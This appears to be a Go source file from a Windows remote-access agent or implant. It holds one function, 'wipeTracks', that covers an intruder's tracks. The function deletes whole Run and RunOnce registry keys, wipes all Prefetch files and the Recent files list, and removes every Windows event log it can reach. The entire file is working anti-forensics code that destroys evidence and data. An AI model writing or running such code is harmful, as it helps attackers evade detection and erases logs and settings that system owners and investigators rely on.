//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// wipeTracks removes registry autorun entries, prefetch, and recent file access traces.
func wipeTracks() string {
	var results []string

	// Remove agent registry persistence entries
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	deleteKey := advapi32.NewProc("RegDeleteKeyW")
	openKey := advapi32.NewProc("RegOpenKeyExW")

	runPaths := []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
	}

	regRemoved, regFailed := 0, 0
	for _, path := range runPaths {
		pathPtr, _ := syscall.UTF16PtrFromString(path)
		var hKey uintptr
		ret, _, _ := openKey.Call(0x80000001, uintptr(unsafe.Pointer(pathPtr)), 0, 0x02000000, uintptr(unsafe.Pointer(&hKey)))
		if ret != 0 {
			regFailed++
			continue
		}
		if dRet, _, _ := deleteKey.Call(hKey, 0); dRet == 0 {
			regRemoved++
		} else {
			regFailed++
		}
	}
	if regRemoved > 0 {
		results = append(results, fmt.Sprintf("registry persistence entries removed (%d/%d keys)", regRemoved, regRemoved+regFailed))
	} else {
		results = append(results, fmt.Sprintf("no registry persistence keys removed (%d unreadable or undeletable)", regFailed))
	}

	// Clear prefetch files
	pfRemoved, pfFailed := 0, 0
	pfDir := filepath.Join(os.Getenv("SYSTEMROOT"), "Prefetch")
	if entries, err := os.ReadDir(pfDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				if err := os.Remove(filepath.Join(pfDir, e.Name())); err == nil {
					pfRemoved++
				} else {
					pfFailed++
				}
			}
		}
	}
	results = append(results, fmt.Sprintf("prefetch: %d removed, %d failed", pfRemoved, pfFailed))

	// Clear recent files
	recRemoved, recFailed := 0, 0
	recentDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	if entries, err := os.ReadDir(recentDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				if err := os.Remove(filepath.Join(recentDir, e.Name())); err == nil {
					recRemoved++
				} else {
					recFailed++
				}
			}
		}
	}
	results = append(results, fmt.Sprintf("recent files: %d removed, %d failed", recRemoved, recFailed))

	// Clear Windows event trace logs
	etlFiles, _ := filepath.Glob(filepath.Join(os.Getenv("SYSTEMROOT"), "System32", "winevt", "Logs", "*.evtx"))
	var failedETL []string
	for _, f := range etlFiles {
		if err := os.Remove(f); err == nil {
			results = append(results, fmt.Sprintf("removed %s", filepath.Base(f)))
		} else {
			failedETL = append(failedETL, fmt.Sprintf("%s (%v)", filepath.Base(f), err))
		}
	}
	if len(failedETL) > 0 {
		results = append(results, fmt.Sprintf("failed to remove %d event logs (usually locked by the Event Log service): %s", len(failedETL), strings.Join(failedETL, ", ")))
	}

	return fmt.Sprintf("track_wipe: %s", strings.Join(results, "; "))
}
